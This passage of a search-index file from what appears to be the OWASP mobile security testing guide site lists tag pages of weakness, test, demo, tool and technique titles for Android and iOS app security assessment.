Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0067: Debuggable Flag Not Disabled          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> <li>            MASWE-0108: Sensitive Data in Network Traffic          </li> <li>            MASWE-0109: Lack of Anonymization or Pseudonymisation Measures          </li> <li>            MASWE-0110: Use of Unique Identifiers for User Tracking          </li> <li>            MASWE-0111: Inadequate Privacy Policy          </li> <li>            MASWE-0112: Inadequate Data Collection Declarations          </li> <li>            MASWE-0113: Lack of Proper Data Management Controls          </li> <li>            MASWE-0114: Inadequate Data Visibility Controls          </li> <li>            MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> <li>            MASWE-0117: Inadequate Permission Management          </li> </ul>","tags":[]},{"location":"tags/#tag:network","title":"network","text":"<ul> <li>            MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic          </li> <li>            MASTG-TEST-0236: Cleartext Traffic Observed on the Network          </li> <li>            MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic          </li> <li>            MASTG-TOOL-0075: Android tcpdump          </li> <li>            MASTG-TOOL-0076: bettercap          </li> <li>            MASTG-TOOL-0077: Burp Suite          </li> <li>            MASTG-TOOL-0078: MITM Relay          </li> <li>            MASTG-TOOL-0079: ZAP          </li> <li>            MASTG-TOOL-0080: tcpdump          </li> <li>            MASTG-TOOL-0081: Wireshark          </li> <li>            MASTG-TOOL-0097: mitmproxy          </li> <li>            MASTG-TOOL-0109: Nope-Proxy          </li> <li>            MASTG-TOOL-0115: HTTP Toolkit          </li> <li>            MASTG-TOOL-0143: badssl          </li> </ul>","tags":[]},{"location":"tags/#tag:placeholder","title":"placeholder","text":"<ul> <li>            MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida          </li> <li>            MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences          </li> <li>            MASTG-KNOW-0016: TBD          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0255: Permission Requests Not Minimized          </li> <li>            MASTG-TEST-0256: Missing Permission Rationale          </li> <li>            MASTG-TEST-0257: Not Resetting Unused Permissions          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> <li>            MASWE-0002: Sensitive Data Stored With Insufficient Access Restrictions in Internal Locations          </li> <li>            MASWE-0003: Backup Unencrypted          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0015: Deprecated Android KeyStore Implementations          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0031: Insecure use of Android Protected Confirmation          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0057: StrandHogg Attack / Task Affinity Vulnerability          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0062: Insecure Services          </li> <li>            MASWE-0063: Insecure Broadcast Receivers          </li> <li>            MASWE-0064: Insecure Content Providers          </li> <li>            MASWE-0065: Sensitive Data Permanently Shared with Other Apps          </li> <li>            MASWE-0066: Insecure Intents          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0073: Insecure WebResourceResponse Implementations          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> </ul>","tags":[]},{"location":"tags/#tag:placeholder-tag-maswe","title":"placeholder-tag-maswe","text":"<ul> <li>            MASTG-TEST-0200: Files Written to External Storage          </li> <li>            MASTG-TEST-0201: Runtime Use of APIs to Access External Storage          </li> <li>            MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage          </li> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0204: Insecure Random API Usage          </li> <li>            MASTG-TEST-0205: Non-random Sources Usage          </li> <li>            MASTG-TEST-0206: Sensitive Data in Network Traffic Capture          </li> <li>            MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime          </li> <li>            MASTG-TEST-0208: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0209: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0210: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0211: Broken Hashing Algorithms          </li> <li>            MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code          </li> <li>            MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic          </li> <li>            MASTG-TEST-0219: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0220: Usage of Outdated Code Signature Format          </li> <li>            MASTG-TEST-0221: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled          </li> <li>            MASTG-TEST-0223: Stack Canaries Not Enabled          </li> <li>            MASTG-TEST-0224: Usage of Insecure Signature Version          </li> <li>            MASTG-TEST-0225: Usage of Insecure Signature Key Size          </li> <li>            MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest          </li> <li>            MASTG-TEST-0227: Debugging Enabled for WebViews          </li> <li>            MASTG-TEST-0228: Position Independent Code (PIC) not Enabled          </li> <li>            MASTG-TEST-0229: Stack Canaries Not enabled          </li> <li>            MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0232: Broken Symmetric Encryption Modes          </li> <li>            MASTG-TEST-0233: Hardcoded HTTP URLs          </li> <li>            MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets          </li> <li>            MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0236: Cleartext Traffic Observed on the Network          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0240: Jailbreak Detection in Code          </li> <li>            MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques          </li> <li>            MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration          </li> <li>            MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration          </li> <li>            MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic          </li> <li>            MASTG-TEST-0245: References to Platform Version APIs          </li> <li>            MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0250: References to Content Provider Access in WebViews          </li> <li>            MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews          </li> <li>            MASTG-TEST-0252: References to Local File Access in WebViews          </li> <li>            MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews          </li> <li>            MASTG-TEST-0254: Dangerous App Permissions          </li> <li>            MASTG-TEST-0255: Permission Requests Not Minimized          </li> <li>            MASTG-TEST-0256: Missing Permission Rationale          </li> <li>            MASTG-TEST-0257: Not Resetting Unused Permissions          </li> <li>            MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements          </li> <li>            MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0263: Logging of StrictMode Violations          </li> <li>            MASTG-TEST-0264: Runtime Use of StrictMode APIs          </li> <li>            MASTG-TEST-0265: References to StrictMode APIs          </li> <li>            MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project          </li> <li>            MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts          </li> <li>            MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0276: Use of the iOS General Pasteboard          </li> <li>            MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime          </li> <li>            MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use          </li> <li>            MASTG-TEST-0279: Pasteboard Contents Not Expiring          </li> <li>            MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device          </li> <li>            MASTG-TEST-0281: Undeclared Known Tracking Domains          </li> <li>            MASTG-TEST-0282: Unsafe Custom Trust Evaluation          </li> <li>            MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification          </li> <li>            MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews          </li> <li>            MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> </ul>","tags":[]},{"location":"tags/#tag:placeholder-tag-test","title":"placeholder-tag-test","text":"<ul> <li>            MASTG-DEMO-0001: File System Snapshots from External Storage          </li> <li>            MASTG-DEMO-0002: External Storage APIs Tracing with Frida          </li> <li>            MASTG-DEMO-0003: App Writing to External Storage without Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0004: App Writing to External Storage with Scoped Storage Restrictions          </li> <li>            MASTG-DEMO-0005: App Writing to External Storage via the MediaStore API          </li> <li>            MASTG-DEMO-0006: Tracing Common Logging APIs Looking for Secrets          </li> <li>            MASTG-DEMO-0007: Common Uses of Insecure Random APIs          </li> <li>            MASTG-DEMO-0008: Uses of Non-random Sources          </li> <li>            MASTG-DEMO-0009: Detecting Sensitive Data in Network Traffic          </li> <li>            MASTG-DEMO-0010: File System Snapshots from Internal Storage          </li> <li>            MASTG-DEMO-0011: Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2          </li> <li>            MASTG-DEMO-0012: Cryptographic Key Generation With Insufficient Key Length          </li> <li>            MASTG-DEMO-0013: Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2          </li> <li>            MASTG-DEMO-0014: Use of Hardcoded ECDSA Private Key in CryptoKit with r2          </li> <li>            MASTG-DEMO-0015: Uses of Broken Hashing Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0016: Uses of Broken Hashing Algorithms in CryptoKit with r2          </li> <li>            MASTG-DEMO-0017: Use of Hardcoded AES Key in SecretKeySpec with semgrep          </li> <li>            MASTG-DEMO-0018: Uses of Broken Encryption Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0019: Uses of isExcludedFromBackupKey with r2          </li> <li>            MASTG-DEMO-0020: Data Exclusion using backup_rules.xml with Backup Manager          </li> <li>            MASTG-DEMO-0021: Uses of Jailbreak Detection Techniques with r2          </li> <li>            MASTG-DEMO-0022: Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep          </li> <li>            MASTG-DEMO-0023: Uses of Broken Encryption Modes in Cipher with semgrep          </li> <li>            MASTG-DEMO-0024: Uses of Caching UI Elements with semgrep          </li> <li>            MASTG-DEMO-0024: Uses of LAContext.canEvaluatePolicy with r2          </li> <li>            MASTG-DEMO-0025: Uses of Build.VERSION.SDK_INT with semgrep          </li> <li>            MASTG-DEMO-0026: Runtime Use of LAContext.canEvaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0027: Runtime Use of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate APIs with Frida          </li> <li>            MASTG-DEMO-0028: Uses of KeyguardManager.isDeviceSecure and BiometricManager.canAuthenticate with semgrep          </li> <li>            MASTG-DEMO-0029: Uses of WebViews Allowing Content Access with semgrep          </li> <li>            MASTG-DEMO-0030: Uses of WebViews Allowing Content Access with Frida          </li> <li>            MASTG-DEMO-0031: Uses of WebViews Allowing Local File Access with Frida          </li> <li>            MASTG-DEMO-0032: Uses of WebViews Allowing Local File Access with semgrep          </li> <li>            MASTG-DEMO-0033: Dangerous Permissions in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0034: Backup and Restore App Data with semgrep          </li> <li>            MASTG-DEMO-0035: Data Exclusion using backup_rules.xml with adb backup          </li> <li>            MASTG-DEMO-0036: Debuggable Entitlement Enabled in the entitlements.plist with rabin2          </li> <li>            MASTG-DEMO-0037: App Leaking Information about Unclosed SQL Cursor via StrictMode          </li> <li>            MASTG-DEMO-0038: Detecting StrictMode Uses with Frida          </li> <li>            MASTG-DEMO-0039: Detecting StrictMode PenaltyLog Usage with Semgrep          </li> <li>            MASTG-DEMO-0040: Debuggable Flag Enabled in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0041: Uses of LAContext.evaluatePolicy with r2          </li> <li>            MASTG-DEMO-0042: Runtime Use of LAContext.evaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0043: Uses of kSecAccessControlUserPresence with r2          </li> <li>            MASTG-DEMO-0044: Runtime Use of kSecAccessControlUserPresence with Frida          </li> <li>            MASTG-DEMO-0045: Uses of kSecAccessControlBiometryCurrentSet with r2          </li> <li>            MASTG-DEMO-0046: Runtime Use of kSecAccessControlBiometryCurrentSet with Frida          </li> <li>            MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida          </li> <li>            MASTG-DEMO-0048: SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier          </li> <li>            MASTG-DEMO-0049: SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier          </li> <li>            MASTG-DEMO-0050: Identifying Insecure Dependencies in Android Studio          </li> <li>            MASTG-DEMO-0051: Identifying Insecure Dependencies through SBOM Creation          </li> <li>            MASTG-DEMO-0052: Scanning Package Manager Artifacts for Insecure iOS Dependencies          </li> <li>            MASTG-DEMO-0053: Identifying Insecure Dependencies in SwiftPM through SBOM creation          </li> <li>            MASTG-DEMO-0054: Use of a TrustManager that Does Not Validate Certificate Chains          </li> <li>            MASTG-DEMO-0055: Use of the HostnameVerifier that Allows Any Hostname          </li> <li>            MASTG-DEMO-0056: WebView Ignoring TLS Errors in onReceivedSslError          </li> <li>            MASTG-DEMO-0057: Network Security Configuration Allows User-Added Certificates          </li> <li>            MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences          </li> </ul>","tags":[]},{"location":"tags/#tag:tech","title":"tech","text":"<ul> <li>            MASTG-TECH-0001: Accessing the Device Shell          </li> <li>            MASTG-TECH-0002: Host-Device Data Transfer          </li> <li>            MASTG-TECH-0003: Obtaining and Extracting Apps          </li> <li>            MASTG-TECH-0004: Repackaging Apps          </li> <li>            MASTG-TECH-0005: Installing Apps          </li> <li>            MASTG-TECH-0006: Listing Installed Apps          </li> <li>            MASTG-TECH-0007: Exploring the App Package          </li> <li>            MASTG-TECH-0008: Accessing App Data Directories          </li> <li>            MASTG-TECH-0009: Monitoring System Logs          </li> <li>            MASTG-TECH-0010: Basic Network Monitoring/Sniffing          </li> <li>            MASTG-TECH-0011: Setting Up an Interception Proxy          </li> <li>            MASTG-TECH-0012: Bypassing Certificate Pinning          </li> <li>            MASTG-TECH-0013: Reverse Engineering Android Apps          </li> <li>            MASTG-TECH-0014: Static Analysis on Android          </li> <li>            MASTG-TECH-0015: Dynamic Analysis on Android          </li> <li>            MASTG-TECH-0016: Disassembling Code to Smali          </li> <li>            MASTG-TECH-0017: Decompiling Java Code          </li> <li>            MASTG-TECH-0018: Disassembling Native Code          </li> <li>            MASTG-TECH-0019: Retrieving Strings          </li> <li>            MASTG-TECH-0020: Retrieving Cross References          </li> <li>            MASTG-TECH-0021: Information Gathering - API Usage          </li> <li>            MASTG-TECH-0022: Information Gathering - Network Communication          </li> <li>            MASTG-TECH-0023: Reviewing Decompiled Java Code          </li> <li>            MASTG-TECH-0024: Reviewing Disassembled Native Code          </li> <li>            MASTG-TECH-0025: Automated Static Analysis          </li> <li>            MASTG-TECH-0026: Dynamic Analysis on Non-Rooted Devices          </li> <li>            MASTG-TECH-0027: Get Open Files          </li> <li>            MASTG-TECH-0028: Get Open Connections          </li> <li>            MASTG-TECH-0029: Get Loaded Native Libraries          </li> <li>            MASTG-TECH-0030: Sandbox Inspection          </li> <li>            MASTG-TECH-0031: Debugging          </li> <li>            MASTG-TECH-0032: Execution Tracing          </li> <li>            MASTG-TECH-0033: Method Tracing          </li> <li>            MASTG-TECH-0034: Native Code Tracing          </li> <li>            MASTG-TECH-0035: JNI Tracing          </li> <li>            MASTG-TECH-0036: Emulation-based Analysis          </li> <li>            MASTG-TECH-0037: Symbolic Execution          </li> <li>            MASTG-TECH-0038: Patching          </li> <li>            MASTG-TECH-0039: Repackaging &amp; Re-Signing          </li> <li>            MASTG-TECH-0040: Waiting for the Debugger          </li> <li>            MASTG-TECH-0041: Library Injection          </li> <li>            MASTG-TECH-0042: Getting Loaded Classes and Methods Dynamically          </li> <li>            MASTG-TECH-0043: Method Hooking          </li> <li>            MASTG-TECH-0044: Process Exploration          </li> <li>            MASTG-TECH-0045: Runtime Reverse Engineering          </li> <li>            MASTG-TECH-0047: Reverse Engineering          </li> <li>            MASTG-TECH-0048: Static Analysis          </li> <li>            MASTG-TECH-0049: Dynamic Analysis          </li> <li>            MASTG-TECH-0050: Binary Analysis          </li> <li>            MASTG-TECH-0051: Tampering and Runtime Instrumentation          </li> <li>            MASTG-TECH-0052: Accessing the Device Shell          </li> <li>            MASTG-TECH-0053: Host-Device Data Transfer          </li> <li>            MASTG-TECH-0054: Obtaining and Extracting Apps          </li> <li>            MASTG-TECH-0055: Launching a Repackaged App in Debug Mode          </li> <li>            MASTG-TECH-0056: Installing Apps          </li> <li>            MASTG-TECH-0057: Listing Installed Apps          </li> <li>            MASTG-TECH-0058: Exploring the App Package          </li> <li>            MASTG-TECH-0059: Accessing App Data Directories          </li> <li>            MASTG-TECH-0060: Monitoring System Logs          </li> <li>            MASTG-TECH-0061: Dumping KeyChain Data          </li> <li>            MASTG-TECH-0062: Basic Network Monitoring/Sniffing          </li> <li>            MASTG-TECH-0063: Setting up an Interception Proxy          </li> <li>            MASTG-TECH-0064: Bypassing Certificate Pinning          </li> <li>            MASTG-TECH-0065: Reverse Engineering iOS Apps          </li> <li>            MASTG-TECH-0066: Static Analysis on iOS          </li> <li>            MASTG-TECH-0067: Dynamic Analysis on iOS          </li> <li>            MASTG-TECH-0068: Disassembling Native Code          </li> <li>            MASTG-TECH-0069: Decompiling Native Code          </li> <li>            MASTG-TECH-0070: Extracting Information from the Application Binary          </li> <li>            MASTG-TECH-0071: Retrieving Strings          </li> <li>            MASTG-TECH-0072: Retrieving Cross References          </li> <li>            MASTG-TECH-0073: Information Gathering - API Usage          </li> <li>            MASTG-TECH-0074: Information Gathering - Network Communication          </li> <li>            MASTG-TECH-0075: Reviewing Decompiled Objective-C and Swift Code          </li> <li>            MASTG-TECH-0076: Reviewing Disassembled Objective-C and Swift Code          </li> <li>            MASTG-TECH-0077: Reviewing Disassembled Native Code          </li> <li>            MASTG-TECH-0078: Automated Static Analysis          </li> <li>            MASTG-TECH-0079: Obtaining a Developer Provisioning Profile          </li> <li>            MASTG-TECH-0080: Get Open Files          </li> <li>            MASTG-TECH-0081: Get Open Connections          </li> <li>            MASTG-TECH-0082: Get Shared Libraries          </li> <li>            MASTG-TECH-0083: Sandbox Inspection          </li> <li>            MASTG-TECH-0084: Debugging          </li> <li>            MASTG-TECH-0085: Execution Tracing          </li> <li>            MASTG-TECH-0086: Method Tracing          </li> <li>            MASTG-TECH-0087: Native Code Tracing          </li> <li>            MASTG-TECH-0088: Emulation-based Analysis          </li> <li>            MASTG-TECH-0089: Symbolic Execution          </li> <li>            MASTG-TECH-0090: Injecting Frida Gadget into an IPA Automatically          </li> <li>            MASTG-TECH-0091: Injecting Libraries into an IPA Manually          </li> <li>            MASTG-TECH-0092: Signing IPA files          </li> <li>            MASTG-TECH-0093: Waiting for the debugger          </li> <li>            MASTG-TECH-0094: Getting Loaded Classes and Methods dynamically          </li> <li>            MASTG-TECH-0095: Method Hooking          </li> <li>            MASTG-TECH-0096: Process Exploration          </li> <li>            MASTG-TECH-0097: Runtime Reverse Engineering          </li> <li>            MASTG-TECH-0098: Patching React Native Apps          </li> <li>            MASTG-TECH-0100: Logging Sensitive Data from Network Traffic          </li> <li>            MASTG-TECH-0108: Taint Analysis          </li> <li>            MASTG-TECH-0109: Intercepting Flutter HTTPS Traffic          </li> <li>            MASTG-TECH-0110: Intercepting Flutter HTTPS Traffic          </li> <li>            MASTG-TECH-0111: Extracting Entitlements from MachO Binaries          </li> <li>            MASTG-TECH-0112: Obtaining the Code Signature Format Version          </li> <li>            MASTG-TECH-0112: Reverse Engineering Flutter Applications          </li> <li>            MASTG-TECH-0113: Obtaining Debugging Symbols          </li> <li>            MASTG-TECH-0114: Demangling Symbols          </li> <li>            MASTG-TECH-0115: Obtaining Compiler-Provided Security Features          </li> <li>            MASTG-TECH-0116: Obtaining Information about the APK Signature          </li> <li>            MASTG-TECH-0117: Obtaining Information from the AndroidManifest          </li> <li>            MASTG-TECH-0118: Obtaining Compiler-Provided Security Features          </li> <li>            MASTG-TECH-0119: Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer          </li> <li>            MASTG-TECH-0120: Intercepting HTTP Traffic Using an Interception Proxy          </li> <li>            MASTG-TECH-0121: Intercepting Non-HTTP Traffic Using an Interception Proxy          </li> <li>            MASTG-TECH-0122: Passive Eavesdropping          </li> <li>            MASTG-TECH-0123: Achieving a MITM Position via ARP Spoofing          </li> <li>            MASTG-TECH-0124: Achieving a MITM Position Using a 